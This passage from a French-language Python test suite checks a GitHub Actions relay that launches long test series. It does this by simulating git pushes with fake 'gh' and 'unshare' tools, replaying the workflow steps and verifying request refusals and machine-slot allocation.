    ⑩ EFFET — Écrit dans un dossier jetable, effacé à la fin.
    ⑪ TERMINAISON — Rend la main. [sort: non]
    """
    faux = []
    d = tempfile.mkdtemp(prefix="relais_series_")
    try:
        try:
            F = charger(os.path.join(racine, FABRICANT), "FABRICANT_EPROUVE")
            J = charger(os.path.join(racine, JOUEUR), "JOUEUR_DES_PARTS_EPROUVE")
            R = charger(os.path.join(racine, RASSEMBLEUR), "RASSEMBLEUR_EPROUVE")
        except Exception as e:   # noqa: BLE001 — tout échec de chargement est un cas faux
            return [f"chargement : {type(e).__name__} : {e}"]
        if F.RELAIS is None or F.SERIES is None:
            return [f"le fabricant n'a pas fabriqué ses gabarits : {F.ERREUR_DE_LA_TABLE}"]
        # les trois circuits du réservoir, dans l'ordre où le relais doit lire leurs passages (étape FILE-2, 20-11-2026) ;
        # écrits ici à partir des chemins, et non lus dans CIRCUITS_DU_GROUPE_LONG, pour que S49 morde
        LONGS = [os.path.basename(F.CIRCUIT_SERIES), os.path.basename(F.CIRCUIT_EPREUVES),
                 os.path.basename(F.CIRCUIT_CERTIFICATION)]
        table = json.load(open(os.path.join(racine, TABLE), encoding="utf-8"))
        # l'attendu : la table lue ICI, en JSON, sans le fabricant
        ref = {}
        for epreuve, e in table["series_hors_de_la_nuit"].items():
            s = e.get("serie_du_circuit")
            if isinstance(s, dict):
                ref[s.get("code")] = (epreuve, s.get("machines"), s.get("lot"), e.get("releve"))
        # T0 : le cas réel — HL et Yahoo seulement : la table peut porter d'autres séries (bloc 2bis du plan V7,
        # 11-11-2026, agent E : séries Boucle et Signaux ajoutées), le témoin ne dit que ce que jouait le circuit
        # en service avant le 08-11-2026 ; une série du témoin disparue de la table reste un écart
        if {c: v[:3] for c, v in ref.items() if c in TEMOIN} != TEMOIN:
            faux.append(f"T0 la table ne dit plus ce que jouait le circuit en service : {ref}")
        entrees = entrees_declarees(F.SERIES)
        outils = os.path.join(d, "outils")
        os.makedirs(outils)
        for nom, texte in (("gh", FAUX_GH), ("unshare", FAUX_UNSHARE)):
            open(os.path.join(outils, nom), "w").write(texte)
            os.chmod(os.path.join(outils, nom), 0o755)
        version = os.path.join(d, "version")   # la copie minimale de la version jouée par le pas matrice
        os.makedirs(os.path.join(version, "tests", "outils"))
        shutil.copyfile(os.path.join(racine, TABLE), os.path.join(version, TABLE))
        shutil.copyfile(os.path.join(racine, JOUEUR), os.path.join(version, JOUEUR))
        for epreuve in table["series_hors_de_la_nuit"]:
            open(os.path.join(version, epreuve), "w").close()
        # 15-11-2026 (GHUB ②) : le pas matrice des épreuves longues lance tests/outils/jouer_une_epreuve_longue.py, qui
        # lit la table par le fabricant de la version ; chaque épreuve longue y est un fichier vide
        os.makedirs(os.path.join(version, "programmes"))
        shutil.copyfile(os.path.join(racine, FABRICANT), os.path.join(version, FABRICANT))
        shutil.copyfile(os.path.join(racine, JOUEUR_D_EPREUVE), os.path.join(version, JOUEUR_D_EPREUVE))
        for e in (table.get("epreuves_longues") or {}).values():
            open(os.path.join(version, e["chemin"]), "a").close()
        env_relais, script_relais = pas_du_gabarit(F.RELAIS, "relayer")
        env_matrice, script_matrice = pas_du_gabarit(F.SERIES, "matrice")
        env_jouer, script_jouer = pas_du_gabarit(F.SERIES, "jouer_la_part")
        env_rass, script_rass = pas_du_gabarit(F.SERIES, "rassembler")
        if None in (env_relais, env_matrice, env_jouer, env_rass):
            return faux + ["un pas du relais ou du circuit des séries est introuvable (relayer, matrice, "
                           "jouer_la_part, rassembler)"]
        compteur = [0]

        # les fiches des circuits que le relais lance, telles que le fabricant les écrit (18-11-2026), et le relais
        # lui-même (25-11-2026, T1 : l'examen exige que le relais de la branche soit une file du groupe GROUPE_DU_RELAIS)
        FICHES = {F.CIRCUIT_SERIES: F.SERIES, F.CIRCUIT_EPREUVES: F.EPREUVES, F.CIRCUIT_CERTIFICATION: F.CERTIFICATION,
                  F.CIRCUIT_RELAIS: F.RELAIS}

        def depot(branche, fichiers, autres_commits=0, nouvelle_branche=False, modifier=False, fiches=None):
            """Rend (avant, après, dossier) d'une poussée imitée : un dépôt, sa pointe d'avant, le commit poussé.

            ① RÔLE — Fabriquer la branche publique et la poussée que le relais reçoit.
            ② CONTEXTE D'APPEL — `relayer`, une fois par cas.
            ③ ENTRÉE — `branche` ; `fichiers` : [(chemin, octets)] du commit poussé ; `autres_commits` : commits de code avant lui ; `nouvelle_branche` : pointe d'avant nulle ; `modifier` : la demande existe déjà à la base ; `fiches` : {chemin : texte} des circuits du commit de base (FICHES par défaut).
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — TROIS valeurs : pointe d'avant (40 zéros si nouvelle branche), commit poussé, dossier. [rend: 3]
            ⑥ TRAITEMENT — git init, un commit de base, les commits demandés.
            ⑦ UNITÉ — —
            ⑧ POURQUOI — Les gardes ① du relais (un seul commit, un seul fichier ajouté) se jugent sur un vrai historique git.
            ⑨ CE QUI CLOCHE — Un « git » qui échoue n'est pas signalé ici : le relais le verra (commit absent).
            ⑩ EFFET — Écrit dans le dossier jetable du tour.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            fiches = FICHES if fiches is None else fiches
            compteur[0] += 1
            r = os.path.join(d, f"public_{compteur[0]}")
            lancer(["git", "init", "-q", "-b", branche, r])
            open(os.path.join(r, "LISEZMOI.txt"), "w").write("base\n")
            for chemin, texte in fiches.items():
                os.makedirs(os.path.dirname(os.path.join(r, chemin)), exist_ok=True)
                open(os.path.join(r, chemin), "w", encoding="utf-8").write(texte)
            if modifier:
                os.makedirs(os.path.join(r, "demandes"))
                open(os.path.join(r, NOM), "w").write("serie=HL\n")
            lancer(["git", "-C", r, "add", "-A"])
            lancer(["git", "-C", r, "commit", "-q", "-m", "base"])
            avant = "0" * 40 if nouvelle_branche else lancer(["git", "-C", r, "rev-parse", "HEAD"])[1].strip()
            for k in range(autres_commits):
                open(os.path.join(r, f"code_{k}.py"), "w").write("x = 1\n")
                lancer(["git", "-C", r, "add", "-A"])
                lancer(["git", "-C", r, "commit", "-q", "-m", "code"])
            for chemin, octets in fichiers:
                os.makedirs(os.path.dirname(os.path.join(r, chemin)), exist_ok=True)
                open(os.path.join(r, chemin), "wb").write(octets)
            lancer(["git", "-C", r, "add", "-A"])
            lancer(["git", "-C", r, "commit", "-q", "-m", "demande"])
            return avant, lancer(["git", "-C", r, "rev-parse", "HEAD"])[1].strip(), r

        def relayer(branche, fichiers, en_cours='[{"status": "completed"}, {"status": "completed"}]', circuit=True,
                    version=True, evenement="push", refus_gh=False, **forme):
            """Joue le relais sur une poussée imitée ; rend (code, sortie, appels de gh).

            ① RÔLE — Jouer le pas « relayer » du relais fabriqué comme GitHub le jouerait sur cette poussée.
            ② CONTEXTE D'APPEL — `tour`, pour chaque cas V, P, E, X et K.
            ③ ENTRÉE — `branche`, `fichiers` ; `en_cours` : ce que le faux gh répond à « run list » (les passages
              imités, étape FILE-2) ; `circuit`, `version` : ajouter « circuit=series » et « version=<branche> »
              s'ils manquent ; `evenement` : push ou workflow_dispatch ; `refus_gh` : le faux gh refuse tout lancement ;
              `forme` (passé à `depot`).
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — TROIS valeurs : code du pas, sa sortie, la liste des appels de gh ({args, repo, jeton}). [rend: 3]
            ⑥ TRAITEMENT — contexte github.* imité ; environnement du bloc « env: » résolu ; bash -e -o pipefail ; le faux gh en tête du PATH.
            ⑦ UNITÉ — —
            ⑧ POURQUOI — Fiche en tête, ⑥.
            ⑨ CE QUI CLOCHE — Le PATH réel suit le faux : une commande absente de la machine manquerait comme sur GitHub, pas
              davantage. Au bouton, GitHub ne fournit pas « github.event.before » : il est imité vide.
            ⑩ EFFET — Écrit dans le dossier jetable du tour.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            # le circuit (ajout du 08-11-2026, 18h06) : une demande sans « circuit= » reçoit « circuit=series » en tête,
            # sauf `circuit=False` (cas E7) ; la version (18-11-2026) : « version=<branche> » sauf `version=False` (P37)
            # ou si la demande la porte déjà (P08)
            dem = lambda c: c.startswith("demandes/DEMANDE_")
            if circuit:
                fichiers = [(c, o if not dem(c) or b"circuit=" in o else b"circuit=series\n" + o) for c, o in fichiers]
            if version:
                fichiers = [(c, o if not dem(c) or b"version=" in o else b"version=" + branche.encode() + b"\n" + o)
                            for c, o in fichiers]
            avant, apres, r = depot(branche, fichiers, **forme)
            return jouer_le_relais(r, "" if evenement == "workflow_dispatch" else avant, apres, branche, evenement,
                                   refus_gh, en_cours)

        def jouer_le_relais(r, avant, apres, branche, evenement, refus_gh=False,
                            en_cours='[{"status": "completed"}, {"status": "completed"}]'):
            """Joue le pas « relayer » dans le dépôt `r` ; rend (code, sortie, appels de gh).

            ① RÔLE — Le geste commun de `relayer` et du cas D2 (une demande déposée par DEPOSER_UNE_DEMANDE.py).
            ② CONTEXTE D'APPEL — `relayer` ; le cas D2.
            ③ ENTRÉE — `r` : le dépôt ; `avant`, `apres` : github.event.before et github.sha ; `branche` ; `evenement` ;
              `refus_gh` ; `en_cours` (fiche de `relayer`).
            ④ CONDITIONS D'ENTRÉE — `apres` est la copie de travail de `r` (le relais lit le commit, pas la copie).
            ⑤ SORTIE — TROIS valeurs : code, sortie, appels de gh. [rend: 3]
            ⑥ TRAITEMENT — Fiche de `relayer`, ⑥. ⑦ UNITÉ — — ⑧ POURQUOI — R-708 : un seul endroit imite GitHub.
            ⑨ CE QUI CLOCHE — — ⑩ EFFET — Écrit dans le dossier jetable du tour. ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            compteur[0] += 1
            rt = os.path.join(d, f"rt_{compteur[0]}")
            os.makedirs(rt)
            journal = os.path.join(rt, "gh.jsonl")
            contexte = {"github.event.before": avant, "github.sha": apres, "github.ref_name": branche,
                        "github.repository": "essai/public", "github.token": "jeton-fictif-du-passage",
                        "github.event_name": evenement}
            env = dict(GIT_ENV, PATH=outils + os.pathsep + os.environ["PATH"], RUNNER_TEMP=rt,
                       FAUX_GH_JOURNAL=journal, FAUX_GH_REFUS="1" if refus_gh else "0", FAUX_GH_PASSAGES=en_cours,
                       **resoudre(env_relais, contexte))
            c, o = lancer(["bash", "--noprofile", "--norc", "-e", "-o", "pipefail", "-c", script_relais], env=env, cwd=r)
            appels = [json.loads(l) for l in open(journal, encoding="utf-8")] if os.path.exists(journal) else []
            return c, o, appels

        def lances(appels):
            """Rend les appels « gh workflow run » d'une liste d'appels de gh.

            ① RÔLE — Isoler les lancements.
            ② CONTEXTE D'APPEL — `tour`.
            ③ ENTRÉE — `appels` : la liste rendue par `relayer`.
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — UNE valeur : la sous-liste. [rend: 1]
            ⑥ TRAITEMENT — filtre sur les deux premiers arguments.
            ⑦ UNITÉ — —
            ⑧ POURQUOI — Un refus se juge à ZÉRO lancement, une acceptation à UN.
            ⑨ CE QUI CLOCHE — —
            ⑩ EFFET — Aucun.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            return [a for a in appels if a["args"][:2] == ["workflow", "run"]]

        def suivre(nom, branche, demande, appel):
            """Suit un « gh workflow run » jusqu'au joueur ; rend la liste des écarts à l'attendu.

            ① RÔLE — Le cœur de l'épreuve : ce que lit le joueur = ce que dit la demande (et la table pour le reste).
            ② CONTEXTE D'APPEL — `tour`, pour chaque demande valide qui lance.
            ③ ENTRÉE — `nom` du cas ; `branche` ; `demande` : le texte déposé ; `appel` : l'appel « gh workflow run ».
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — UNE valeur : la liste des écarts (vide : conforme). [rend: 1]
            ⑥ TRAITEMENT — arguments de gh lus strictement ; entrées contrôlées contre celles déclarées par le circuit des séries, défauts appliqués ; attendu calculé depuis la demande et la table ; pas « matrice », puis « Jouer la part » par ligne et « Rassembler » par série, chacun joué avec son environnement résolu ; lectures par `lire_les_arguments` du joueur et du rassembleur ; comparaison champ par champ.
            ⑦ UNITÉ — —
            ⑧ POURQUOI — Fiche en tête, ⑧ (le lot 262 arrêté, n°298).
            ⑨ CE QUI CLOCHE — L'horodatage du relevé est jugé par sa forme seulement (il dépend de l'heure). La conversion des types par GitHub est imitée (str).
            ⑩ EFFET — Écrit dans le dossier jetable du tour.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            ecarts = []
            a = appel["args"]
            if a[2:5] != [os.path.basename(F.CIRCUIT_SERIES), "--ref", branche] or (len(a) - 5) % 2:
                return [f"{nom} : gh workflow run mal formé : {a}"]
            if appel["repo"] != "essai/public" or appel["jeton"] != "jeton-fictif-du-passage":
                ecarts.append(f"{nom} : gh lancé sans le dépôt ou le jeton du passage")
            donnees = {}
            for k in range(5, len(a), 2):
                cle, egal, valeur = a[k + 1].partition("=")
                if a[k] != "-f" or not egal or cle in donnees:
                    return ecarts + [f"{nom} : argument de gh refusé (forme, ou entrée donnée deux fois) : {a[k:k + 2]}"]
                donnees[cle] = valeur
            # GitHub : entrées non déclarées refusées, choix hors liste refusés, nombres lus, défauts appliqués
            for cle, valeur in donnees.items():
                e = entrees.get(cle)
                if e is None:
                    return ecarts + [f"{nom} : entrée non déclarée par le circuit des séries : {cle}"]
                if e["options"] is not None and valeur not in e["options"]:
                    return ecarts + [f"{nom} : choix refusé par GitHub : {cle}={valeur}"]
                if e["type"] == "number" and not re.fullmatch(r"[0-9]+", valeur):
                    return ecarts + [f"{nom} : nombre illisible : {cle}={valeur}"]
            boutons = {cle: donnees.get(cle, e["default"]) for cle, e in entrees.items()}
            # l'attendu, depuis la demande (lue ici) et la table
            lu = dict(l.split("=", 1) for l in demande.split("\n") if l and not l.startswith("#"))
            if boutons.get("version") != branche:
                ecarts.append(f"{nom} : version {boutons.get('version')}, attendue {branche}")
            if appel.get("demande", True) and donnees.get("demande") != f"DEMANDE_{HEURE}@{branche}":
                ecarts.append(f"{nom} : demande {donnees.get('demande')!r}, attendue DEMANDE_{HEURE}@{branche}")
            # A-811 (15-11-2026) : la pointe de la demande arrive telle quelle à l'entrée « pointe » du bouton
            if boutons.get("pointe", "") != lu.get("pointe", ""):
                ecarts.append(f"{nom} : pointe {boutons.get('pointe')!r}, attendue {lu.get('pointe', '')!r}")
            choisies = sorted(ref) if lu["serie"] == "toutes" else [lu["serie"]]
            attendu = {s: (ref[s][0], int(lu.get(f"parts_{s.lower()}", ref[s][1])),
                           int(lu.get(f"lot_{s.lower()}", ref[s][2])), ref[s][3]) for s in choisies}
            # le pas matrice, avec les entrées du bouton
            rt = tempfile.mkdtemp(prefix="rt_matrice_", dir=d)
            sortie = os.path.join(rt, "sortie")
            contexte = {f"inputs.{k}": v for k, v in boutons.items()}
            env = dict(GIT_ENV, PATH=outils + os.pathsep + os.environ["PATH"], GITHUB_OUTPUT=sortie, RUNNER_TEMP=rt,
                       **resoudre(env_matrice, contexte))
            c, o = lancer(["bash", "--noprofile", "--norc", "-e", "-o", "pipefail", "-c", script_matrice], env=env,
                          cwd=version)
            if c != 0:
                return ecarts + [f"{nom} : pas matrice code {c} : {o[-300:]}"]
            sorties = dict(l.split("=", 1) for l in open(sortie, encoding="utf-8").read().split("\n") if "=" in l)
            matrice, series = json.loads(sorties["matrice"]), json.loads(sorties["series"])
            # étape FILE-2 : la k-ième entrée de chaque matrice prend la place ((p − 1 + k) modulo PLACES_LONGUES) + 1, p
            # la première place transmise par le relais (1 si elle n'est pas une place du réservoir)
            pp = boutons.get("premiere_place") or ""
            p0 = int(pp) if re.fullmatch(r"[0-9]{1,2}", pp) and 1 <= int(pp) <= F.PLACES_LONGUES else 1
            for quoi, liste in (("matrice", matrice), ("series", series)):
                vues = [x.get("place") for x in liste]
                voulues = [str((p0 - 1 + k) % F.PLACES_LONGUES + 1) for k in range(len(liste))]
                if vues != voulues:
                    ecarts.append(f"{nom} : places de la {quoi} {vues} au lieu de {voulues}")
            # chaque ligne de matrice → « Jouer la part » → lecture du joueur
            par_serie = {}
            for ligne in matrice:
                rt = tempfile.mkdtemp(prefix="rt_part_", dir=d)
                journal = os.path.join(rt, "unshare.jsonl")
                contexte = {f"matrix.{k}": v for k, v in ligne.items()}
                contexte["runner.temp"] = rt
                env = dict(GIT_ENV, PATH=outils + os.pathsep + os.environ["PATH"], RUNNER_TEMP=rt,
                           FAUX_UNSHARE_JOURNAL=journal, FAUX_UNSHARE_CODE="0", **resoudre(env_jouer, contexte))
                lancer(["bash", "--noprofile", "--norc", "-e", "-o", "pipefail", "-c", script_jouer], env=env, cwd=rt)
                commandes = [json.loads(l) for l in open(journal, encoding="utf-8")] if os.path.exists(journal) else []
                if len(commandes) != 1 or commandes[0][:5] != ["-rn", "python3", "-B", "-u", JOUEUR]:
                    return ecarts + [f"{nom} : « Jouer la part » n'a pas lancé le joueur une fois : {commandes}"]
                try:
                    lus = J.lire_les_arguments(commandes[0][5:])
                except ValueError as e:
                    return ecarts + [f"{nom} : le joueur refuse sa ligne de commande : {e}"]
                if lus["racine"] != os.path.realpath(os.path.join(rt, "depot")) or \
                        lus["travail"] != os.path.realpath(os.path.join(rt, "travail")):
                    ecarts.append(f"{nom} : racine ou travail du joueur : {lus['racine']}, {lus['travail']}")
                serie = ligne.get("serie")
                par_serie.setdefault(serie, []).append(lus)
            if sorted(par_serie) != sorted(attendu):
                ecarts.append(f"{nom} : séries jouées {sorted(par_serie)}, attendues {sorted(attendu)}")
            for s, lus_s in par_serie.items():
                if s not in attendu:
                    continue
                epreuve, n, lot, modele = attendu[s]
                motif = re.escape(modele).replace(r"\*", HORODATAGE)
                if sorted(x["part"] for x in lus_s) != list(range(n)):
                    ecarts.append(f"{nom} : série {s} : parts lues {sorted(x['part'] for x in lus_s)}, attendues 0..{n - 1}")
                for x in lus_s:
                    vu = (x["epreuve"], x["nb_parts"], x["lot"])
                    if vu != (epreuve, n, lot) or not re.fullmatch(motif, x["releve"]):
                        ecarts.append(f"{nom} : série {s} : le joueur lit {vu}, {x['releve']} ; attendu "
                                      f"{(epreuve, n, lot)}, {modele}")
                        break
                if len({x["releve"] for x in lus_s}) != 1:
                    ecarts.append(f"{nom} : série {s} : plusieurs relevés pour une série")
            # chaque série → « Rassembler » → lecture du rassembleur
            for ligne in series:
                rt = tempfile.mkdtemp(prefix="rt_rass_", dir=d)
                journal = os.path.join(rt, "unshare.jsonl")
                contexte = {f"matrix.{k}": v for k, v in ligne.items()}
                contexte.update({"runner.temp": rt, "needs.preparer.outputs.sha": "f" * 40})
                env = dict(GIT_ENV, PATH=outils + os.pathsep + os.environ["PATH"], RUNNER_TEMP=rt,
                           FAUX_UNSHARE_JOURNAL=journal, FAUX_UNSHARE_CODE="2", GITHUB_RUN_ID="1",
                           **resoudre(env_rass, contexte))
                lancer(["bash", "--noprofile", "--norc", "-e", "-o", "pipefail", "-c", script_rass], env=env, cwd=rt)
                commandes = [json.loads(l) for l in open(journal, encoding="utf-8")] if os.path.exists(journal) else []
                if len(commandes) != 1 or commandes[0][:5] != ["-rn", "python3", "-B", "-u", RASSEMBLEUR]:
                    ecarts.append(f"{nom} : « Rassembler » n'a pas lancé le rassembleur une fois : {commandes}")
                    continue
                try:
                    lus = R.lire_les_arguments(commandes[0][5:])
                except ValueError as e:
                    ecarts.append(f"{nom} : le rassembleur refuse sa ligne de commande : {e}")
                    continue
                if lus["depuis"] != os.path.realpath(os.path.join(rt, "parts")) or \
                        lus["travail"] != os.path.realpath(os.path.join(rt, "rassemble")):
                    ecarts.append(f"{nom} : série {ligne.get('serie')} : le rassembleur lit depuis={lus['depuis']}, "
                                  f"travail={lus['travail']}")
                parts_s = par_serie.get(ligne.get("serie")) or [{}]
                if (lus["epreuve"], lus["releve"]) != (parts_s[0].get("epreuve"), parts_s[0].get("releve")):
                    ecarts.append(f"{nom} : série {ligne.get('serie')} : le rassembleur lit {lus['epreuve']}, "
                                  f"{lus['releve']} ; les parts {parts_s[0].get('epreuve')}, {parts_s[0].get('releve')}")
            return ecarts

        # V : les demandes valides
        for nom, branche, demande in VALIDES:
            c, o, appels = relayer(branche, [(NOM, demande.encode())])
            a_blanc = "a_blanc=oui" in demande
            if c != 0 or len(lances(appels)) != (0 if a_blanc else 1):
                faux.append(f"{nom} : relais code {c}, {len(lances(appels))} lancement(s) : {o[-300:]}")
                continue
            listes = [x["args"] for x in appels if x["args"][:2] == ["run", "list"]]
            # 15-11-2026 (GHUB ②) : les passages des circuits longs, séries d'abord ; étape FILE-2 (20-11-2026) : la
            # certification aussi, ses tranches occupent des places
            if [x[2:4] for x in listes] != [["--workflow", w] for w in LONGS]:
                faux.append(f"{nom} : le relais n'a pas regardé les passages du groupe des machines longues : {listes}")
            if a_blanc:
                if "A BLANC" not in o or "parts_hl 5 ; lot_hl 9" not in o:
                    faux.append(f"{nom} : le journal à blanc ne dit pas les valeurs : {o[-300:]}")
                continue
            # fusion du 25-11-2026 : « … -f premiere_place=<p> -f nombre_de_places=<n> -f demande=<identifiant> »
            if lances(appels)[0]["args"][-6:-4] != ["-f", "premiere_place=1"]:
                faux.append(f"{nom} : aucun passage en cours, la première place lancée n'est pas la 1 : "
                            f"{lances(appels)[0]['args'][-6:]}")
            faux += suivre(nom, branche, demande, lances(appels)[0])
        # V0 (tour 2, I-1) : le bouton « Run workflow » appuyé SANS relais, aucune entrée donnée sauf la version : les
        # valeurs par défaut DÉCLARÉES par le circuit des séries doivent mener le joueur aux valeurs de la table (et T0
        # confronte la table au témoin). Le relais passe toujours toutes les valeurs : sans ce cas, les défauts du bouton
        # n'étaient jamais exercés.
        faux += suivre("V0 bouton sans relais", "main", "serie=" + str(entrees.get("serie", {}).get("default")),
                       {"args": ["workflow", "run", os.path.basename(F.CIRCUIT_SERIES), "--ref", "main", "-f",
                                 "version=main"], "repo": "essai/public", "jeton": "jeton-fictif-du-passage",
                        "demande": False})
        # P : les demandes piégées, chacune refusée pour sa raison, rien de lancé
        M = F.PLACES_LONGUES

        def attendu_premiere(titres, w):
            """Rend la première place que le relais doit choisir : l'ORACLE de l'épreuve, écrit ici sans le relais.

            ① RÔLE — Recalculer, en Python, le choix des places décrit dans l'en-tête du relais (étape FILE-2).
            ② CONTEXTE D'APPEL — `tour`, cas P27, P29, Q, E5, X9, X10.
            ③ ENTRÉE — `titres` : les titres des passages non finis ; `w` : le nombre de jobs de la demande.
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — UNE valeur : la première place (texte). [rend: 1]
            ⑥ TRAITEMENT — charge de chaque place : « … places p+n » charge n places à partir de p (en tournant, n borné à
              PLACES_LONGUES) ; un autre titre est ignoré ; la fenêtre de min(w, PLACES_LONGUES) places
              consécutives de plus petite charge, la première en cas d'égalité.
            ⑦ UNITÉ — Un numéro de place.
            ⑧ POURQUOI — Une seconde écriture, indépendante, du même choix : l'épreuve compare deux calculs.
            ⑨ CE QUI CLOCHE — —
            ⑩ EFFET — Aucun.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            charge = [0] * (M + 1)
            for titre in titres:
                m = re.search(r" places ([1-9][0-9]?)\+([1-9][0-9]{0,2})$", titre or "")
                if m and 1 <= int(m.group(1)) <= M and int(m.group(2)) >= 1:
                    for i in range(min(int(m.group(2)), M)):
                        charge[(int(m.group(1)) - 1 + i) % M + 1] += 1
            w = max(1, min(w, M))
            sommes = [sum(charge[(q - 1 + i) % M + 1] for i in range(w)) for q in range(1, M + 1)]
            return str(sommes.index(min(sommes)) + 1)

        def accepte(nom, premiere, nombre, c, o, appels):
            """Range parmi les cas faux une demande qui n'est pas lancée, une fois, sur les places attendues.

            ① RÔLE — Juger un cas du réservoir (étape FILE-2, 20-11-2026).
            ② CONTEXTE D'APPEL — `tour`, pour les cas P27, P29, Q, E5, X9, X10.
            ③ ENTRÉE — `nom` ; `premiere`, `nombre` : la première place et le nombre de places attendus (textes) ; `c`, `o`,
              `appels` : ce que rend `relayer`.
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — Aucune valeur : ajoute à `faux`. [rend: rien]
            ⑥ TRAITEMENT — faux si code non nul, ou pas exactement un lancement, ou s'il ne finit pas par
              « -f premiere_place=<premiere> -f nombre_de_places=<nombre> -f demande=DEMANDE_… » (l'identifiant de la
              demande en dernier depuis la fusion du 25-11-2026).
            ⑦ UNITÉ — —
            ⑧ POURQUOI — Une demande n'est JAMAIS refusée pour un passage en cours (A-884 ②, décision du 20-11-2026 à
              20h52) : elle part, sur les places les moins chargées.
            ⑨ CE QUI CLOCHE — La file elle-même est celle de GitHub (« queue: max ») : elle n'est pas imitée ici.
            ⑩ EFFET — Ajoute à la liste `faux` du tour.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            l = lances(appels)
            # fusion du 25-11-2026 : le relais lance « … <places> -f demande=<identifiant> » ; les places précèdent la demande
            if (c != 0 or len(l) != 1 or l[0]["args"][-6:-2] != ["-f", f"premiere_place={premiere}", "-f",
                                                                  f"nombre_de_places={nombre}"]
                    or l[0]["args"][-2] != "-f" or not l[0]["args"][-1].startswith("demande=DEMANDE_")):
                faux.append(f"{nom} : code {c}, lancements {[x['args'][-6:] for x in l]}, places attendues "
                            f"{premiere}+{nombre} : {o[-200:]}")

        def refus(nom, attendu, c, o, appels):
            """Range parmi les cas faux une demande piégée qui n'est pas refusée pour sa raison.

            ① RÔLE — Juger un cas P.
            ② CONTEXTE D'APPEL — `tour`, pour chaque cas P.
            ③ ENTRÉE — `nom` ; `attendu` : un fragment du message de refus ; `c`, `o`, `appels` : ce que rend `relayer`.
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — Aucune valeur : ajoute à `faux`. [rend: rien]
            ⑥ TRAITEMENT — faux si code nul, ou un lancement, ou pas de « DEMANDE REFUSEE », ou pas le fragment.
            ⑦ UNITÉ — —
            ⑧ POURQUOI — Un refus pour une AUTRE raison masquerait une garde retirée (mesuré par S15 : sans le contrôle ASCII, l'accent est encore refusé, par le motif de la ligne).
            ⑨ CE QUI CLOCHE — —
            ⑩ EFFET — Ajoute à la liste `faux` du tour.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            if c == 0 or lances(appels) or "DEMANDE REFUSEE" not in o or attendu not in o:
                faux.append(f"{nom} : code {c}, {len(lances(appels))} lancement(s), message : {o.strip()[-200:]!r}")

        for nom, demande, attendu in PIEGEES:
            refus(nom, attendu, *relayer("main", [(NOM, demande.encode("utf-8"))]))
        refus("P21 deux fichiers dans le commit", "UN seul fichier",
              *relayer("main", [(NOM, b"serie=HL\n"), ("programmes/X.py", b"x = 1\n")]))
        refus("P22 deux commits dans la poussée", "plus d'un commit",
              *relayer("main", [(NOM, b"serie=HL\n")], autres_commits=1))
        refus("P23 nom hors de demandes/SERIE_<date>.txt", "nom refuse",
              *relayer("main", [("demandes/serie.txt", b"serie=HL\n")]))
        refus("P24 fichier modifié, non ajouté", "pas ajoute", *relayer("main", [(NOM, b"serie=Yahoo\n")], modifier=True))
        refus("P25 branche créée par la poussée", "pointe d'avant",
              *relayer("main", [(NOM, b"serie=HL\n")], nouvelle_branche=True))
        refus("P26 branche qui n'est pas une version", "branche", *relayer("autre", [(NOM, b"serie=HL\n")]))
        refus("P30 version en attente sans pointe (A-811)", "pointe manque",
              *relayer("travail-essai", [(NOM, b"serie=HL\n")]))
        # P27, P29 (étape FILE-2, 20-11-2026) : un passage en cours ou en attente n'est JAMAIS un refus ; la demande part
        # sur les places libres. Chaque état non fini doit être vu. La demande règle 2 machines (parts_hl=2) : avec les
        # machines de la table, une fenêtre pourrait couvrir tout le réservoir, et le choix ne se verrait plus.
        hl = "2"
        DHL = b"serie=HL\nparts_hl=2\n"
        for etat in ("in_progress", "queued", "waiting", "pending", "requested"):   # N1 de Cowork (tour 2)
            accepte(f"P27 un passage des séries « {etat} » d'une autre branche, places 1+{hl}",
                    attendu_premiere(["x places 1+" + hl], int(hl)), hl,
                    *relayer("main", [(NOM, DHL)], en_cours=json.dumps(
                        [{"status": "completed", "displayTitle": "Series longues de sabotages places 7+3"},
                         {"status": etat, "displayTitle": "Series longues de sabotages places 1+" + hl}])))
        # (tour 3, C7 de Cowork) un passage ancien en attente derrière 30 passages récents finis : il doit être vu
        accepte("P29 un passage en attente derrière 30 passages finis", attendu_premiere(["x places 4+2"], int(hl)), hl,
                *relayer("main", [(NOM, DHL)], en_cours=json.dumps(
                    [{"status": "completed", "displayTitle": "y places 1+18"}] * 30
                    + [{"status": "queued", "displayTitle": "Series longues de sabotages places 4+2"}])))
        # Q : LE RÉSERVOIR (étape FILE-2) — plusieurs demandes en même temps, chacune sur la fenêtre de places la moins
        # chargée ; jamais un refus. Chaque cas : les titres en cours, la place attendue (oracle), et une valeur écrite
        # à la main qui doit être celle de l'oracle (pour que l'oracle lui-même soit éprouvé).
        def passage(titre, etat="in_progress"):
            """Rend un passage imité, tel que « gh run list --json status,displayTitle » le décrit.

            ① RÔLE — Écrire un passage non fini d'un circuit long. ② CONTEXTE D'APPEL — `tour`, cas Q.
            ③ ENTRÉE — `titre` ; `etat`. ④ CONDITIONS D'ENTRÉE — — ⑤ SORTIE — UNE valeur : le dictionnaire. [rend: 1]
            ⑥ TRAITEMENT — — ⑦ UNITÉ — — ⑧ POURQUOI — Le relais lit les places d'un passage dans son titre.
            ⑨ CE QUI CLOCHE — — ⑩ EFFET — Aucun. ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            return {"status": etat, "displayTitle": titre}
        w_hl = int(hl)
        for nom, titres, a_la_main in (
                ("Q1 une autre demande en cours sur les places 1+3 : la 2e part après", ["Series longues de sabotages places 1+3"],
                 "4" if w_hl <= M - 3 else None),
                ("Q2 un titre sans places est ignoré : place 1", ["Series longues de sabotages"], "1"),
                ("Q3 deux demandes, 3+4 et un réservoir plein (1+18) : les places 1-2, avant les places prises",
